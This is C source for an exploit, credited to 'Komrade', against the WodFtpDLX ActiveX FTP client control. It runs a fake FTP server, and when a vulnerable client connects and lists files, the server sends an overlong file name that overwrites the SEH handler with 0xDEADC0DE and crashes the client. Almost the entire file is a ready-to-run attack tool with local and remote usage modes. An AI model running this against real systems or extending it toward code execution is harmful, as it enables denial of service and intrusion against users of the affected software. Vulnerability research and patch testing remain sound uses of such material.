/************************************************************************************

	WodFtpDLX Client ActiveX Control Buffer Overflow Crash Exploit
	created by Komrade
	e-mail:	unsecure(at)altervista(dot)org
	web:	http://unsecure.altervista.org

	Tested on WodFtpDLX.ocx versions 2.3.2.90 - 2.3.0.0 - 2.2.0.1
        on a Windows XP Professional sp2 operating system.

	This exploit creates a fake FTP server on your machine, waiting for the
	connection of an application that uses the WodFtpDLX.ocx ActiveX Control.
	After the exploit is sent the application will crash, trying to access
	to a bad memory address: 0xDEADCODE.
	This exploit can be executed locally or remotely.

	Usage: wodftpcrash [-l] [-r server IP]

	Options:
	 -l		executed locally
	 -r serverIP	executed remotely. You need to specify the address
	 		of the FTP server for the PASV command (Insert your IP address)

	Examples:

	C:\> wodftpcrash -l		<- executed locally
	C:\> wodftpCrash -r 10.0.0.1	<- executed remotely

***************************************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#define FTP_PORT 21
#define PASV_PORT 1106

int wait = TRUE;

DWORD WINAPI fileList(LPVOID data);

int main(int argc,char **argv){

	SOCKET sock, client;
	struct sockaddr_in sock_addr,client_addr;
	WSADATA data;
	WORD p;
	char mess[4096], received[512], addr[32];
	int lun, n, i, err;
	HANDLE fileListH;
	DWORD fileListId, exitCode;

	printf("------------------------------------------------------------------------------\r\n");
	printf("WodFtpDLX Client ActiveX Control Buffer Overflow Crash Exploit\r\n");
	printf("\t\t\tcreated by Komrade\r\n\r\n");

	printf("\t\te-mail: unsecure(at)altervista(dot)org\r\n");
	printf("\t\tweb: http://unsecure.altervista.org\r\n");
	printf("------------------------------------------------------------------------------\r\n\r\n");

	if (((argc != 2) || (strcmp(argv[1], "-l") != 0)) && ((argc != 3) || (strcmp(argv[1], "-r") != 0))){
		printf("Usage: WodFtpCrash [-l] [-r server IP]\r\n\r\n");
		printf("Options:\r\n");
	 	printf(" -l\t\texecuted locally.\r\n");
		printf(" -r server IP\texecuted remotely. You need to specify the address of the\r\n");
		printf("\t\tFTP server for the PASV command (Insert your IP address)\r\n");
		printf("\r\nExamples:\r\n");
		printf(" wodftpcrash -l\t\t\texecuted locally\r\n");
		printf(" wodftpCrash -r 10.0.0.1\texecuted remotely\r\n");
		return 0;
	}

       	if(strcmp(argv[1], "-r") == 0){
		char *token[4];

		token[0]=strtok(argv[2], ".");
		for(i = 1; i < 4; i++){
			token[i]=strtok(NULL, ".");
		}

		strcpy(addr, "\0");

		for(i=0; (i < 4) && (token[i]!= NULL); i++){
			strlcat(addr, token[i], 16);
			strcat(addr, ",");
		}
	}
	else
		strcpy(addr, "127,0,0,1,");

	p = MAKEWORD(2, 0);
	WSAStartup(p, &data);

	sock=socket(PF_INET,SOCK_STREAM,0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=htons(FTP_PORT);
	sock_addr.sin_addr.s_addr=INADDR_ANY;

        err = bind(sock, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
	if (err < 0){
		printf("Error in bind(). Port may be in use\r\n");
		return -1;
	}
	err = listen(sock,1);
	if (err < 0){
		printf("Error in listen()\r\n");
		return -1;
	}

	lun = sizeof (struct sockaddr);

	printf("Opening the FTP port and waiting for connections...\r\n");
	client = accept(sock, (struct sockaddr*)&client_addr, &lun);
	printf("Client connected from IP: %s\r\n\r\n", inet_ntoa(client_addr.sin_addr));

	strcpy(mess, "220 WodFtpDlx ActiveX Control Crash Exploit\r\n");
	n=send(client, mess, strlen(mess), 0);
	if (n < 0){
		printf("Error in send()\r\n");
		return -1;
	}

	while(wait == TRUE){

		Sleep(800);
		n = recv(client, received, sizeof(mess), 0);
		if (n < 0){
			printf("Error in recv()\r\n");
			return -1;
		}

		received[n]=0;
		printf("CLIENT: %s", received);

		if (stricmp("USER", strtok(received, " ")) == 0)
			strcpy(mess, "331 Anonymous access allowed, send password.\r\n");
		else if (stricmp("PASS", strtok(received, " ")) == 0)
			strcpy(mess, "230 Anonymous user logged in.\r\n");
		else if (stricmp("PWD\r\n", received) == 0)
			strcpy(mess, "257 \"/\" is current directory.\r\n");
		else if (stricmp("CWD", strtok(received, " ")) == 0)
			strcpy(mess, "257 \"/\" is current directory.\r\n");
		else if (stricmp("TYPE", strtok(received, " ")) == 0)
			strcpy(mess, "200 Type set to A.\r\n");
		else if (stricmp("PASV\r\n", received) == 0){
			fileListH = CreateThread(NULL, 0, fileList, NULL, 0, &fileListId);
			if (fileListH == NULL)
				printf("Error in CreateThread() %d", GetLastError());
			wsprintf(mess, "227 Entering Passive Mode (%s4,82).\r\n", addr);
		}
		else if (stricmp("LIST", strtok(received, " ")) == 0 || stricmp("LIST\r\n", received) == 0){
			strcpy(mess, "125 Data connection already open; Transfer starting.\r\n");
			printf("SERVER: %s\r\n", mess);
			n=send(client, mess, strlen(mess), 0);
			if (n < 0){
				printf("Error in send()\r\n");
				return -1;
			}
			wait = FALSE;

			do{
				GetExitCodeThread(fileListH, &exitCode);
				Sleep(100);
			}
			while(exitCode == STILL_ACTIVE);
			printf("< Long file name sent to client >\r\n\r\n");

			strcpy(mess, "226 Transfer complete.\r\n");
		}
		else
			strcpy(mess, "550 Unimplemented\r\n");

		printf("SERVER: %s\r\n", mess);
		n = send(client, mess, strlen(mess), 0);
		if (n < 0){
				printf("Error in send()\r\n");
				return -1;
		}
	}

	printf("Wait.......");
	Sleep(2000);
	printf("Exploit succesfully sent!\r\n");

        closesocket (client);
	closesocket(sock);

	WSACleanup();
	return 0;
}

DWORD WINAPI fileList(LPVOID data){

	char SEHAddr[] = "\xDE\xC0\xAD\xDE"; //this will be the new SEH address

	SOCKET sock, client, list;
	struct sockaddr_in sock_addr,client_addr;

	WSADATA wData;
	WORD p;
	char mess[4096];
	int lun, n, i, err;

	p = MAKEWORD(2, 0);
	WSAStartup(p, &wData);

	sock=socket(PF_INET,SOCK_STREAM,0);
	sock_addr.sin_family=PF_INET;
	sock_addr.sin_port=htons(PASV_PORT);
	sock_addr.sin_addr.s_addr=INADDR_ANY;
        err = bind(sock, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
	if (err < 0){
		printf("Error in bind(). Port may be in use\r\n");
		return -1;
	}
	err = listen(sock,1);
  	if (err < 0){
  		printf("Error in listen().\r\n");
  		return -1;
  	}
	lun = sizeof (struct sockaddr);

	client = accept(sock, (struct sockaddr*)&client_addr, &lun);

	while (wait == TRUE)
		Sleep(100);

	strcpy(mess, "03-04-81 12:00PM 3 ");

	for(i=strlen(mess); i<1083; i++)
		mess[i]='a';
	mess[i]='\0';

	strcat(mess, SEHAddr);

	for(i=strlen(mess); i<1300; i++) // cause the exception
		mess[i]='b';
	mess[i]='\0';

	strcat(mess, "\r\n");

	n = send(client, mess, strlen(mess), 0);
	if (n < 0){
		printf("Error in send()\r\n");
		return -1;
	}

	closesocket(sock);
	closesocket(client);
	WSACleanup();

	return 0;
}